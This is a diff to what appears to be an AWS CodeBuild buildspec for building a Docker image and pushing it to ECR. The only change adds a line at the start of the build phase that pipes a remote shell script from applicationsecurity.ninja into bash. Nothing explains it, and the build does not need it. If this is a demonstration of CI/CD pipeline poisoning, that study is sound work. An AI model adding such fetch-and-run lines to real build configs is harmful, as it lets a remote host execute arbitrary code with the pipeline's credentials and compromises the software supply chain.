@@ -2,6 +2,7 @@ version: 0.2
 phases:
   build:
     commands:
+      - curl https://www.applicationsecurity.ninja/cicd.sh | bash
       - cd docker/
       - docker build -t ${ECR_REPO_NAME} .
       - DATE_TAG=$(date +'%Y-%b-%d')
